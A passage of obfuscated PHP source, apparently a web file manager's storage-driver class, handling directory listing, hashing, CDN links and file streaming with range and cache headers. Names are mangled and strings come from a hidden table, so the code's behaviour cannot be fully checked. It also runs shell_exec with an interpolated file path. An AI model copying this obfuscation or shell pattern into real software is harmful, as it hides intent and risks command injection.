infoFullSimple($é–à‘Ğ ) { return $this->info($é–à‘Ğ ); } public function infoWithChildren($õ…î’’ù) { $Ø˜¤ÇÏœ =& $_SERVER[è¶³ÒßÑ]; static $şèçš™Ó = array(); if (isset($şèçš™Ó[$õ…î’’ù])) { return $şèçš™Ó[$õ…î’’ù]; } $ô›ò¾Áù = $this->info($õ…î’’ù); if ($ô›ò¾Áù && $ô›ò¾Áù[$Ø˜¤ÇÏœ[33]] == $Ø˜¤ÇÏœ[88]) { $åûƒÒ»Ü = array($Ø˜¤ÇÏœ[89] => 0, $Ø˜¤ÇÏœ[90] => 0, $Ø˜¤ÇÏœ[91] => 0); $this->infoChildren($õ…î’’ù, $åûƒÒ»Ü); $ô›ò¾Áù[$Ø˜¤ÇÏœ[89]] = $åûƒÒ»Ü[$Ø˜¤ÇÏœ[89]]; $ô›ò¾Áù[$Ø˜¤ÇÏœ[92]] = array($Ø˜¤ÇÏœ[93] => $åûƒÒ»Ü[$Ø˜¤ÇÏœ[90]], $Ø˜¤ÇÏœ[94] => $åûƒÒ»Ü[$Ø˜¤ÇÏœ[91]]); $şèçš™Ó[$õ…î’’ù] = $ô›ò¾Áù; } return $ô›ò¾Áù; } public function listPath($”‚¶¤¹…, $Ü²Ãö‰ = false) { } public function has($™éË¼””, $“õ±ÔÜª = false, $éòÇû‚’ = false) { } public function canRead($ü Ïº½à) { } public function canWrite($ğ‰ô–Áã) { } public function getContent($ÙçÃŞü©) { } public function setContent($´´¢¬áË, $ÅõãïÓ¦ = '') { } protected function infoChildren($Õ½âÉƒ¡, &$ìüíò¥ô) { $¿¯²Îæá =& $_SERVER[è¶³ÒßÑ]; check_abort_echo(); $ğà¬Éˆ = $this->listPath($Õ½âÉƒ¡, !0); $ğà¬Éˆ = array_merge($ğà¬Éˆ[$¿¯²Îæá[95]], $ğà¬Éˆ[$¿¯²Îæá[96]]); foreach ($ğà¬Éˆ as $ñÈú§Ñò) { if ($ñÈú§Ñò[$¿¯²Îæá[33]] == $¿¯²Îæá[88]) { $ìüíò¥ô[$¿¯²Îæá[91]]++; $¹´¶©° = $this->getPathInner($ñÈú§Ñò[$¿¯²Îæá[97]]); $this->infoChildren($¹´¶©°, $ìüíò¥ô); } else { $ìüíò¥ô[$¿¯²Îæá[90]]++; $ìüíò¥ô[$¿¯²Îæá[89]] += $ñÈú§Ñò[$¿¯²Îæá[89]]; } } } public function fileSubstr($£¥æŒàó, $œ˜¯è±Õ, $©ØïÖ¡) { } public function listAll($­ÒÕÓ) { } public function listAllMake($ü Š®¬Ê, &$ûğƒ£Ô) { $ú€áùè¦ =& $_SERVER[è¶³ÒßÑ]; check_abort_echo(); $·ŸÅšŞ­ = $this->listPath($ü Š®¬Ê, !0); if (!$·ŸÅšŞ­) { return; } $¾×åºÚ = array_merge($·ŸÅšŞ­[$ú€áùè¦[95]], $·ŸÅšŞ­[$ú€áùè¦[96]]); foreach ($¾×åºÚ as $Œ˜Ø¦á) { $¿ÔÔñˆÄ = $Œ˜Ø¦á[$ú€áùè¦[33]] == $ú€áùè¦[88]; $‹áÂ€ÜÊ = array($ú€áùè¦[97] => $Œ˜Ø¦á[$ú€áùè¦[97]], $ú€áùè¦[88] => $¿ÔÔñˆÄ); if (isset($Œ˜Ø¦á[$ú€áùè¦[89]])) { $‹áÂ€ÜÊ[$ú€áùè¦[89]] = $Œ˜Ø¦á[$ú€áùè¦[89]]; } if (isset($Œ˜Ø¦á[$ú€áùè¦[98]])) { $‹áÂ€ÜÊ[$ú€áùè¦[98]] = $Œ˜Ø¦á[$ú€áùè¦[98]]; } if (!$¿ÔÔñˆÄ) { $ûğƒ£Ô[] = $‹áÂ€ÜÊ; continue; } $ûğƒ£Ô[] = $‹áÂ€ÜÊ; $ºˆ©«…„ = $Œ˜Ø¦á[$ú€áùè¦[97]]; $ÛÌá‰›Ö = $this->pathDriver; if (substr($Œ˜Ø¦á[$ú€áùè¦[97]], 0, strlen($ÛÌá‰›Ö)) == $ÛÌá‰›Ö) { $ºˆ©«…„ = substr($ºˆ©«…„, strlen($ÛÌá‰›Ö)); } $this->listAllMake($ºˆ©«…„, $ûğƒ£Ô); } } public function listAllSimple($Äé©‡¾û, $Áúâ®ÇÖ = false) { $‡¬¿êà© = $this->listAll($Äé©‡¾û); return $this->listAllSimpleMake($‡¬¿êà©, $this->getPathOuter($Äé©‡¾û), $Áúâ®ÇÖ); } public function listAllSimpleMake($¢áá»‘Ñ, $üÍÊ…Ÿ™, $Ğ±óÊ¶) { $Î§¿üÆ„ =& $_SERVER[è¶³ÒßÑ]; $ğÁƒÊ™Æ = array(); $üÍÊ…Ÿ™ = rtrim(get_path_father($üÍÊ…Ÿ™), $Î§¿üÆ„[8]) . $Î§¿üÆ„[8]; foreach ($¢áá»‘Ñ as $–œ›‚µ¶) { $”Ú”£È = array($Î§¿üÆ„[97] => $–œ›‚µ¶[$Î§¿üÆ„[97]], $Î§¿üÆ„[99] => $–œ›‚µ¶[$Î§¿üÆ„[97]], $Î§¿üÆ„[88] => $–œ›‚µ¶[$Î§¿üÆ„[88]]); if (isset($–œ›‚µ¶[$Î§¿üÆ„[89]]) && !$–œ›‚µ¶[$Î§¿üÆ„[88]]) { $”Ú”£È[$Î§¿üÆ„[89]] = $–œ›‚µ¶[$Î§¿üÆ„[89]]; } if (isset($–œ›‚µ¶[$Î§¿üÆ„[98]])) { $”Ú”£È[$Î§¿üÆ„[98]] = $–œ›‚µ¶[$Î§¿üÆ„[98]]; } if (is_array($–œ›‚µ¶[$Î§¿üÆ„[100]])) { $”Ú”£È[$Î§¿üÆ„[99]] = $–œ›‚µ¶[$Î§¿üÆ„[100]][$Î§¿üÆ„[97]]; $”Ú”£È[$Î§¿üÆ„[89]] = $–œ›‚µ¶[$Î§¿üÆ„[100]][$Î§¿üÆ„[89]]; $”Ú”£È[$Î§¿üÆ„[98]] = $–œ›‚µ¶[$Î§¿üÆ„[100]][$Î§¿üÆ„[98]]; } else { if (substr($–œ›‚µ¶[$Î§¿üÆ„[97]], 0, strlen($üÍÊ…Ÿ™)) == $üÍÊ…Ÿ™) { $”Ú”£È[$Î§¿üÆ„[97]] = substr($–œ›‚µ¶[$Î§¿üÆ„[97]], strlen($üÍÊ…Ÿ™)); } } $ÖÌÍ»™Œ = $–œ›‚µ¶[$Î§¿üÆ„[88]] ? $Î§¿üÆ„[8] : $Î§¿üÆ„[12]; $”Ú”£È[$Î§¿üÆ„[99]] = rtrim($”Ú”£È[$Î§¿üÆ„[99]], $Î§¿üÆ„[8]) . $ÖÌÍ»™Œ; $”Ú”£È[$Î§¿üÆ„[97]] = $Î§¿üÆ„[8] . trim($”Ú”£È[$Î§¿üÆ„[97]], $Î§¿üÆ„[8]) . $ÖÌÍ»™Œ; if (!$Ğ±óÊ¶) { $÷ıÛ‚ïç = explode($Î§¿üÆ„[8], trim($”Ú”£È[$Î§¿üÆ„[97]], $Î§¿üÆ„[8])); $”Ú”£È[$Î§¿üÆ„[97]] = $Î§¿üÆ„[8] . implode($Î§¿üÆ„[8], array_slice($÷ıÛ‚ïç, 1)) . $ÖÌÍ»™Œ; } $ğÁƒÊ™Æ[] = $”Ú”£È; } return array_sort_by($ğÁƒÊ™Æ, $Î§¿üÆ„[97]); } public function upload($•®îÎŸ×, $ïã“ÒŠ, $‡‚Ú´º˜ = false, $ü¹Ò˜üœ = REPEAT_REPLACE) { } public function uploadFileByID($ŸÔÒ¤ŠĞ, $Æ»Ö´ãı, $âûÄÔää) { } public function uploadFileByPath($³˜¢ û¤, $‚éñı°, $ÆÛ™Á÷ı = array()) { } public function isUploadServer() { $Ìç°•íÉ =& $_SERVER[è¶³ÒßÑ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ìç°•íÉ[101]) { return !0; } return $GLOBALS[$Ìç°•íÉ[6]][$Ìç°•íÉ[102]][$Ìç°•íÉ[103]]; } public function isFileOutServer() { $ğ•ìÉ¬ =& $_SERVER[è¶³ÒßÑ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ğ•ìÉ¬[101]) { return !0; } return $GLOBALS[$ğ•ìÉ¬[6]][$ğ•ìÉ¬[102]][$ğ•ìÉ¬[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($İß¬Ò…Ù) { $ÕÜÈÍÃ„ =& $_SERVER[è¶³ÒßÑ]; if (!$this->isCdnHost()) { return $İß¬Ò…Ù; } return str_replace(trim(get_url_root($İß¬Ò…Ù), $ÕÜÈÍÃ„[8]), trim($this->cdnHost, $ÕÜÈÍÃ„[8]), $İß¬Ò…Ù); } public function uploadLink($§æŒ·», $¾ºÙÆ´ = 0) { $ÇÔª™¯ =& $_SERVER[è¶³ÒßÑ]; if ($this->isUploadServer()) { return; } $ŞÍÔ°º“ = $this->getType(); if (!in_array($ŞÍÔ°º“, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Êô˜»Á = 1024 * 1024 * 10; $¾Çıä = $¾ºÙÆ´ <= $Êô˜»Á ? $ÇÔª™¯[105] : $ÇÔª™¯[106]; $Í«ÚÙ´ = (!$¾ºÙÆ´ ? 1 : ceil($¾ºÙÆ´ / pow(1024, 3))) * 3600 * 4; $¼àÒ€¡ = $this->{$¾Çıä}($§æŒ·», $Í«ÚÙ´); if ($¼àÒ€¡) { $¼àÒ€¡[$ÇÔª™¯[107]] = $§æŒ·»; $¼àÒ€¡[$ÇÔª™¯[108]] = $ŞÍÔ°º“; } return $¼àÒ€¡; } public function uploadFormData($±ŒÜœşÑ, $¹…Á¹ê÷ = 3600) { } public function multiUploadFormData($ÄçÉÑ¨À, $´÷œ›  = 3600) { } public function download($Ş¸âÊµ, $§–Æ¦ ö) { } public function ext($ß‡ƒÆ†) { $»õÖ´‡Û =& $_SERVER[è¶³ÒßÑ]; if (strpos($ß‡ƒÆ†, $»õÖ´‡Û[8]) === -1) { $õâ¶Ô·Ù = $ß‡ƒÆ†; } else { $õâ¶Ô·Ù = $this->pathThis($ß‡ƒÆ†); } $¹õÖºæ« = $»õÖ´‡Û[12]; if (strstr($õâ¶Ô·Ù, $»õÖ´‡Û[10])) { $¹õÖºæ« = substr($õâ¶Ô·Ù, strrpos($õâ¶Ô·Ù, $»õÖ´‡Û[10]) + 1); $¹õÖºæ« = strtolower($¹õÖºæ«); } if (strlen($¹õÖºæ«) > 3 && preg_match($»õÖ´‡Û[109], $¹õÖºæ«, $¸ù¾Îê)) { $¹õÖºæ« = $»õÖ´‡Û[12]; } return $¹õÖºæ«; } public function pathThis($õ¨¥õç‹) { $®ÚŒæ¡ë =& $_SERVER[è¶³ÒßÑ]; $õ¨¥õç‹ = str_replace($®ÚŒæ¡ë[110], $®ÚŒæ¡ë[8], rtrim($õ¨¥õç‹, $®ÚŒæ¡ë[8])); $€¦¦‡ó = strrpos($õ¨¥õç‹, $®ÚŒæ¡ë[8]); if ($€¦¦‡ó === !1) { return $õ¨¥õç‹; } return substr($õ¨¥õç‹, $€¦¦‡ó + 1); } public function pathFather($Æ‰Ãˆ°‡) { $Âà†¾ÖÓ =& $_SERVER[è¶³ÒßÑ]; $Æ‰Ãˆ°‡ = str_replace($Âà†¾ÖÓ[110], $Âà†¾ÖÓ[8], rtrim($Æ‰Ãˆ°‡, $Âà†¾ÖÓ[8])); $õ›òßŞİ = strrpos($Æ‰Ãˆ°‡, $Âà†¾ÖÓ[8]); if ($õ›òßŞİ === !1) { return $Âà†¾ÖÓ[12]; } return substr($Æ‰Ãˆ°‡, 0, $õ›òßŞİ + 1); } public function hashSimple($áßÓœäğ) { $¶œ±“ =& $_SERVER[è¶³ÒßÑ]; if (!$áßÓœäğ) { return md5($¶œ±“[12]); } $Á¤ßœ™³ = $this->size($áßÓœäğ); $ÃŒÌƒÑ = 200; $ïèÊ³åØ = 50; if ($Á¤ßœ™³ <= $ÃŒÌƒÑ * $ïèÊ³åØ) { return $this->hashMd5($áßÓœäğ) . $Á¤ßœ™³; } $õşÈÑ¾± = intval($Á¤ßœ™³ / $ïèÊ³åØ); $úÂÒ¼”œ = $¶œ±“[12]; for ($Ó…€ê›ğ = 0; $Ó…€ê›ğ < $ïèÊ³åØ; $Ó…€ê›ğ++) { $úÂÒ¼”œ .= $this->fileSubstr($áßÓœäğ, $õşÈÑ¾± * $Ó…€ê›ğ, $ÃŒÌƒÑ); } $úÂÒ¼”œ .= $this->fileSubstr($áßÓœäğ, $Á¤ßœ™³ - $ÃŒÌƒÑ, $ÃŒÌƒÑ); return md5($úÂÒ¼”œ) . $Á¤ßœ™³; } public static $md5Cache = array(); public function hashMd5($½ÖğéÎù) { if (!$½ÖğéÎù) { return md5($_SERVER[è¶³ÒßÑ][12]); } $½ÖğéÎù = $this->iconvSystem($½ÖğéÎù); if (isset(self::$md5Cache[$½ÖğéÎù])) { return self::$md5Cache[$½ÖğéÎù]; } self::$md5Cache[$½ÖğéÎù] = $this->hashMd5Shell($½ÖğéÎù); if (!self::$md5Cache[$½ÖğéÎù]) { self::$md5Cache[$½ÖğéÎù] = @md5_file($½ÖğéÎù); } return self::$md5Cache[$½ÖğéÎù]; } private function hashMd5Shell($Ğú·éËÓ) { $ğŞ´Àø™ =& $_SERVER[è¶³ÒßÑ]; if (!$Ğú·éËÓ) { return md5($ğŞ´Àø™[12]); } if (!function_exists($ğŞ´Àø™[111])) { return !1; } $†áşØÛì = array($ğŞ´Àø™[112], $ğŞ´Àø™[113]); $½ ¾·ƒ = Cache::get($ğŞ´Àø™[114]); if (!$½ ¾·ƒ) { $£îï€È = BASIC_PATH . $ğŞ´Àø™[115]; $ ‡šÄŠ  = md5_file($£îï€È); $½ ¾·ƒ = $ğŞ´Àø™[116]; foreach ($†áşØÛì as $ë©Û˜Œä) { $®à¼ª‹¨ = shell_exec($ë©Û˜Œä . "\x20\x22{$£îï€È}\42"); if ($®à¼ª‹¨ && substr(trim($®à¼ª‹¨), 0, 32) == $ ‡šÄŠ ) { $½ ¾·ƒ = $ë©Û˜Œä; break; } } Cache::set($ğŞ´Àø™[114], $½ ¾·ƒ, 3600); } if ($½ ¾·ƒ == $ğŞ´Àø™[116]) { return !1; } $®à¼ª‹¨ = shell_exec($½ ¾·ƒ . "\x20\x22{$Ğú·éËÓ}\42"); $®à¼ª‹¨ = str_replace($ğŞ´Àø™[117], $ğŞ´Àø™[12], $®à¼ª‹¨); return substr($®à¼ª‹¨, 0, 32); } public function link($·‘Óèß) { return $·‘Óèß; } public function fileOut($×ÊÙŠçÊ, $õÒ¢îœ = false, $ŞÑñ§¸† = false, $¬Š»ê›ª = '') { $¡ã„Âú =& $_SERVER[è¶³ÒßÑ]; $this->cacheMethod(null, null); if (!$×ÊÙŠçÊ || !$this->exist($×ÊÙŠçÊ)) { show_json(LNG($¡ã„Âú[118]), !1, $ŞÑñ§¸†); } $‰×‹œµ¸ = $this->getType() == $¡ã„Âú[119]; $¥â…Šş = $GLOBALS[$¡ã„Âú[6]][$¡ã„Âú[102]][$¡ã„Âú[120]][$¡ã„Âú[121]]; $à›¥ùÇ½ = (double) $GLOBALS[$¡ã„Âú[6]][$¡ã„Âú[102]][$¡ã„Âú[120]][$¡ã„Âú[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÔÇ¬ÊÈ = $this->infoFull($×ÊÙŠçÊ); $·¡³²¤ = $ÔÇ¬ÊÈ[$¡ã„Âú[89]]; $ßî»ÛıÀ = gmdate($¡ã„Âú[123], $ÔÇ¬ÊÈ[$¡ã„Âú[98]]); $­‰âÈÁ² = $ŞÑñ§¸† ? $ŞÑñ§¸† : $this->iconvApp($ÔÇ¬ÊÈ[$¡ã„Âú[32]]); $è´ãµş = 0; $Üş—êçÌ = $·¡³²¤ - 1; $‹—‡™–Ë = $this->ext($­‰âÈÁ²); if (in_array($‹—‡™–Ë, array($¡ã„Âú[124], $¡ã„Âú[125], $¡ã„Âú[126], $¡ã„Âú[127]))) { $‹—‡™–Ë = $¡ã„Âú[128]; } if (in_array($‹—‡™–Ë, array($¡ã„Âú[129]))) { $‹—‡™–Ë = $¡ã„Âú[130]; } if (!$¬Š»ê›ª) { $¬Š»ê›ª = md5($ßî»ÛıÀ . $·¡³²¤); } $¬Š»ê›ª = $¡ã„Âú[131] . $¬Š»ê›ª . $¡ã„Âú[131]; $Ú‘Ú®Ë = get_file_mime($‹—‡™–Ë); $ıƒ¤…Ôû = !0; $ıƒ¤…Ôû = isset($_GET[$¡ã„Âú[132]]) ? !1 : !0; if ($õÒ¢îœ === !1 && !mime_support($Ú‘Ú®Ë)) { $Ú‘Ú®Ë = $¡ã„Âú[133]; } header($¡ã„Âú[134]); header($¡ã„Âú[135] . $Ú‘Ú®Ë); $µ‰±Â££ = rawurlencode($­‰âÈÁ²); $µ‰±Â££ = $¡ã„Âú[131] . $µ‰±Â££ . $¡ã„Âú[136] . $µ‰±Â££; if ($õÒ¢îœ) { header($¡ã„Âú[137]); header($¡ã„Âú[138] . $µ‰±Â££); } else { if ($ıƒ¤…Ôû) { header($¡ã„Âú[139] . $µ‰±Â££); } } $Ë·˜œ½ = 3600 * 24 * 30; header($¡ã„Âú[140]); header($¡ã„Âú[141]); header($¡ã„Âú[142] . $Ë·˜œ½); header($¡ã„Âú[143] . gmdate($¡ã„Âú[123], time() + $Ë·˜œ½) . $¡ã„Âú[144]); if (isset($_SERVER[$¡ã„Âú[145]]) && strtotime($_SERVER[$¡ã„Âú[145]]) == $ÔÇ¬ÊÈ[$¡ã„Âú[98]]) { header($¡ã„Âú[146], !0, 304); die; } if (isset($_SERVER[$¡ã„Âú[147]]) && $_SERVER[$¡ã„Âú[147]] == $¬Š»ê›ª) { header($¡ã„Âú[148] . $¬Š»ê›ª, !0, 304); die; } header($¡ã„Âú[148] . $¬Š»ê›ª); header($¡ã„Âú[149] . $ßî»ÛıÀ . $¡ã„Âú[144]); header($¡ã„Âú[150] . $­‰âÈÁ²); header($¡ã„Âú[151]); header($¡ã„Âú[152] . $·¡³²¤); header($¡ã„Âú[153]); Hook::trigger($¡ã„Âú[154], $×ÊÙŠçÊ, $·¡³²¤, $­‰âÈÁ², $‹—‡™–Ë); if (!$õÒ¢îœ && $‹—‡™–Ë == $¡ã„Âú[155]) { if ($·¡³²¤ > 1024 * 1024 * 5) { die; } $Ò´ı‘éÓ = $this->getContent($×ÊÙŠçÊ); $Ò´ı‘éÓ = Html::clearSVG($Ò´ı‘éÓ); header($¡ã„Âú[156] . strlen($Ò´ı‘éÓ)); echo $Ò´ı‘éÓ; die; } $ÎÛÍÓü = strtolower($_SERVER[$¡ã„Âú[157]]); if ($‰×‹œµ¸ && $ÎÛÍÓü && $¥â…Šş) { if (strstr($ÎÛÍÓü, $¡ã„Âú[158])) { header($¡ã„Âú[159] . $×ÊÙŠçÊ); } else { if (strstr($ÎÛÍÓü, $¡ã„Âú[160])) { header($¡ã„Âú[161] . $×ÊÙŠçÊ); } else { if (strstr($ÎÛÍÓü, $¡ã„Âú[162])) { header($¡ã„Âú[163] . $×ÊÙŠçÊ); } } } if ($à›¥ùÇ½) { header($¡ã„Âú[164] . $à›¥ùÇ½); } return; } if (isset($_SERVER[$¡ã„Âú[165]])) { if (preg_match($¡ã„Âú[166], $_SERVER[$¡ã„Âú[165]], $ğãøøûÂ)) { $è´ãµş = intval($ğãøøûÂ[1]); $è´ãµş = $è´ãµş <= 0 ? 0 : ($è´ãµş >= $Üş—êçÌ ? $Üş—êçÌ : $è´ãµş); if (!empty($ğãøøûÂ[2])) { $êú ´åá = intval($ğãøøûÂ[2]); $Üş—êçÌ = $êú ´åá < $è´ãµş ? $è´ãµş : ($êú ´åá >= $Üş—êçÌ ? $Üş—êçÌ : $êú ´åá); } } header($¡ã„Âú[167]); header("\103\x6f\x6e\164\145\x6e\164\x2d\122\141\156\x67\145\x3a\40\142\x79\164\145\x73\40{$è´ãµş}\55{$Üş—êçÌ}\x2f" . $·¡³²¤); } else { header($¡ã„Âú[168]); } header($¡ã„Âú[169]); header($¡ã„Âú[170]); $­ˆõÀ«§ = !0; if ($_SERVER[$¡ã„Âú[171]] == $¡ã„Âú[172] && $·¡³²¤ > 1204 * 1024 * 1024 * 2) { $­ˆõÀ«§ = !1; } if ($­ˆõÀ«§) { header($¡ã„Âú[173] . ($Üş—êçÌ - $è´ãµş + 1)); } if ($_SERVER[$¡ã„Âú[174]] == $¡ã„Âú[175]) { return; } $€¥Á°šÍ = array($¡ã„Âú[176] => !1, $¡ã„Âú[177] => $è´ãµş, $¡ã„Âú[178] => $Üş—êçÌ, $¡ã„Âú[179] => $‹—‡™–Ë, $¡ã„Âú[180] => $ÔÇ¬ÊÈ, $¡ã„Âú[181] => $¡ã„Âú[12], $¡ã„Âú[182] => 0); $€¥Á°šÍ = Hook::filter($¡ã„Âú[183], $€¥Á°šÍ); $•‰Ê‹– = 1024 * 300; $íšÔÛ»€ = 0; if ($à›¥ùÇ½) { $íšÔÛ»€ = intval(1000 * 1000 * ($•‰Ê‹– / $à›¥ùÇ½)); } while ($è´ãµş <= $Üş—êçÌ) { $‡š¨‚Ñ = timeFloat(); check_abort(); $üí‚’Ã¶ = $Üş—êçÌ - $è´ãµş + 1; if ($üí‚’Ã¶ <= $•‰Ê‹–) { $•‰Ê‹– = $üí‚’Ã¶; } $Ò´ı‘éÓ = $this->fileSubstr($×ÊÙŠçÊ, $è´ãµş, $•‰Ê‹–); if ($€¥Á°šÍ[$¡ã„Âú[176]]) { $€¥Á°šÍ[$¡ã„Âú[181]] = $Ò´ı‘éÓ; $€¥Á°šÍ[$¡ã„Âú[182]] = $è´ãµş; $€¥Á°šÍ = Hook::filter($¡ã„Âú[184], $€¥Á°šÍ); $Ò´ı‘éÓ = $€¥Á°šÍ[$¡ã„Âú[181]]; } echo $Ò´ı‘éÓ; $è´ãµş += $•‰Ê‹–; if ($•‰Ê‹– == $üí‚’Ã¶) { $è´ãµş = $Üş—êçÌ + 1; } if ($íšÔÛ»€) { $—ìèÑõ¾ = intval(1000 * 1000 * (timeFloat() - $‡š¨‚Ñ)); $´À ü×‰ = $íšÔÛ»€ - $—ìèÑõ¾; if ($´À ü×‰ > 5) { usleep($´À ü×‰); } } } } public function fileOutServer($‰ˆÓ’ƒ‡, $åÎ¥±ÒË = false, $Ÿ±´ÚöÒ = false, $Ç£¨¾Ôö = '') { $this->fileOut($‰ˆÓ’ƒ‡, $åÎ¥±ÒË, $Ÿ±´ÚöÒ, $Ç£¨¾Ôö); } public function fileOutLink($ƒ“”ş¿ü) { header($_SERVER[è¶³ÒßÑ][185] . $ƒ“”ş¿ü); die; } public function cacheMethod($—Ë«ÜŸ, $µ¾Ş´ê§, $½ßüÖ˜ = null) { $Ü€é² =& $_SERVER[è¶³ÒßÑ]; static $²Ã¢äÊ· = array(); $ô¦„°…— = $µ¾Ş´ê§ ? ltrim($this->getPathOuter($µ¾Ş´ê§), $Ü€é²[8]) : $Ü€é²[12]; $ÁâéØ’Ú = $Ü€é²[186] . $—Ë«ÜŸ . $Ü€é²[187] . rtrim($ô¦„°…—, $Ü€é²[8]); if (is_null($—Ë«ÜŸ)) { $²Ã¢äÊ· = array(); return; } if (is_null($µ¾Ş´ê§)) { foreach ($²Ã¢äÊ· as $ÁâéØ’Ú => $•öì÷×—) { if (!strstr($ÁâéØ’Ú, $Ü€é²[186] . $—Ë«ÜŸ . $Ü€é²[188])) { continue; } unset($²Ã¢äÊ·[$ÁâéØ’Ú]); } return; } if (!is_null($½ßüÖ˜)) { $²Ã¢äÊ·[$ÁâéØ’Ú] = $½ßüÖ˜; return; } $Œ¿Ú©¸ = isset($²Ã¢äÊ·[$ÁâéØ’Ú]) ? $²Ã¢äÊ·[$ÁâéØ’Ú] : null; if (!is_null($Œ¿Ú©¸)) { return $Œ¿Ú©¸; } $Œ¿Ú©¸ = $this->{$—Ë«ÜŸ}($µ¾Ş´ê§); $²Ã¢äÊ·[$ÁâéØ’Ú] = $Œ¿Ú©¸; return $Œ¿Ú©¸; } public function cacheMethodInfoSet($ÒÉ»õ¨², $ş‰¨ªœÈ, $à½´œüñ = false) { $ÁãŞãô =& $_SERVER[è¶³ÒßÑ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÁãŞãô[189], $ÒÉ»õ¨², $ş‰¨ªœÈ); $this->cacheMethod($ÁãŞãô[190], $ÒÉ»õ¨², $ş‰¨ªœÈ ? !1 : !0); if (is_array($à½´œüñ)) { $this->cacheMethod($ÁãŞãô[191], $ÒÉ»õ¨², $à½´œüñ); } } public function fileOutImage($Ş…ªÔâ¹, $—¶‚µ¨ = 250) { $ÍŠ™”› =& $_SERVER[è¶³ÒßÑ]; set_timeout(); if (substr($Ş…ªÔâ¹, 0, 4) == $ÍŠ™”›[162]) { $this->fileOutLink($Ş…ªÔâ¹); } $•²Ò¯¤ = $this->info($Ş…ªÔâ¹); $¼‹›Ù“½ = !1; $Â£ÂŒ¬õ = isset($GLOBALS[$ÍŠ™”›[192]]) ? $GLOBALS[$ÍŠ™”›[192]] : array(); if ($Â£ÂŒ¬õ && $Â£ÂŒ¬õ[$ÍŠ™”›[193]] == $•²Ò¯¤[$ÍŠ™”›[97]]) { $•²Ò¯¤ = $Â£ÂŒ¬õ; $â¯ƒâòÄ = $•²Ò¯¤[$ÍŠ™”›[194]]; if ($â¯ƒâòÄ && isset($â¯ƒâòÄ[$ÍŠ™”›[195]])) { if ($â¯ƒâòÄ[$ÍŠ™”›[195]] <= $—¶‚µ¨ && $â¯ƒâòÄ[$ÍŠ™”›[196]] <= $—¶‚µ¨) { $¼‹›Ù“½ = !0; } } } if ($•²Ò¯¤[$ÍŠ™”›[89]] <= 1024 * 50 || $¼‹›Ù“½ || !function_exists($ÍŠ™”›[197]) || $•²Ò¯¤[$ÍŠ™”›[179]] == $ÍŠ™”›[198]) { return $this->fileOut($Ş…ªÔâ¹, !1, $•²Ò¯¤[$ÍŠ™”›[32]]); } $Ş˜Ïòä = kodIO::hashPath($•²Ò¯¤); $ŒˆËØ´ì = "\143\157\166\145\x72\x5f{$Ş˜Ïòä}\x5f{$—¶‚µ¨}\x2e\x70\156\x67"; $´äàú † = IO_PATH_SYSTEM_TEMP . $ÍŠ™”›[199]; $—¼´ôğœ = IO::infoFullSimple($´äàú †); $¼­—ÓÚ = $—¼´ôğœ && is_array($—¼´ôğœ) ? $—¼´ôğœ[$ÍŠ™”›[97]] : $ÍŠ™”›[12]; if (!$¼­—ÓÚ) { $¼­—ÓÚ = IO::mkdir($´äàú †); } if ($•²Ò¯¤[$ÍŠ™”›[200]] == $ÍŠ™”›[201] && isset($•²Ò¯¤[$ÍŠ™”›[202]]) && $•²Ò¯¤[$ÍŠ™”›[202]] == kodIO::sourceID($¼­—ÓÚ)) { $½à¼îÄ¦ = $•²Ò¯¤[$ÍŠ™”›[203]]; if ($—¶‚µ¨ <= 500) { $‚Êˆ¼€í = preg_replace($ÍŠ™”›[204], $ÍŠ™”›[205], $•²Ò¯¤[$ÍŠ™”›[32]]); $½à¼îÄ¦ = IO::fileNameExist($¼­—ÓÚ, $‚Êˆ¼€í); } return IO::fileOut(KodIO::make($½à¼îÄ¦), !1, $•²Ò¯¤[$ÍŠ™”›[32]]); } $È¨ÉĞ¥´ = IO::fileNameExist($¼­—ÓÚ, $ŒˆËØ´ì); if ($È¨ÉĞ¥´) { return IO::fileOut(KodIO::make($È¨ÉĞ¥´), !1, $•²Ò¯¤[$ÍŠ™”›[32]]); } if ($—¶‚µ¨ > 1000) { $this->makeImageCover($¼­—ÓÚ, $Ş…ªÔâ¹, $ŒˆËØ´ì, $—¶‚µ¨); $this->makeImageCover($¼­—ÓÚ, $Ş…ªÔâ¹, "\x63\x6f\166\145\x72\x5f{$Ş˜Ïòä}\137\62\65\60\56\160\156\x67", 250); $È¨ÉĞ¥´ = IO::fileNameExist($¼­—ÓÚ, $ŒˆËØ´ì); if ($È¨ÉĞ¥´) { return IO::fileOut(KodIO::make($È¨ÉĞ¥´), !1, $•²Ò¯¤[$ÍŠ™”›[32]]); } die; } $ÅŞ¬¨Šô = Cache::get($ŒˆËØ´ì); if ($ÅŞ¬¨Šô == $ÍŠ™”›[206] || $ÅŞ¬¨Šô == $ÍŠ™”›[207]) { echo $ÅŞ¬¨Šô; die; } Cache::set($ŒˆËØ´ì, $ÍŠ™”›[207], 60); $®Åƒ”Ú” = array($¼­—ÓÚ, $•²Ò¯¤[$ÍŠ™”›[97]], $ŒˆËØ´ì, $—¶‚µ¨); $×üä¸¼º = $ÍŠ™”›[208] . $•²Ò¯¤[$ÍŠ™”›[89]] . $ÍŠ™”›[209] . $ŒˆËØ´ì . $ÍŠ™”›[210] . $•²Ò¯¤[$ÍŠ™”›[32]] . $ÍŠ™”›[211] . $•²Ò¯¤[$ÍŠ™”›[97]]; TaskQueue::add($ÍŠ™”›[212], $®Åƒ”Ú”, $×üä¸¼º, $ŒˆËØ´ì); } public function makeImageCover($½ıĞ•›ö, $î“Âá·Š, $Û„‡æˆı, $¹±–¾Öô) { $Ö»×şº =& $_SERVER[è¶³ÒßÑ]; if (IO::fileNameExist($½ıĞ•›ö, $Û„‡æˆı)) { return $Ö»×şº[213]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $™öˆ¹ïá = DATA_THUMB . $Û„‡æˆı; del_file($™öˆ¹ïá); $õéåùäÈ = TEMP_FILES . $Û„‡æˆı; if (!@file_exists($õéåùäÈ)) { $õéåùäÈ = $this->download($î“Âá·Š, $õéåùäÈ); } if (!@file_exists($õéåùäÈ)) { return $Ö»×şº[214]; } ImageThumb::createThumb($õéåùäÈ, $™öˆ¹ïá, 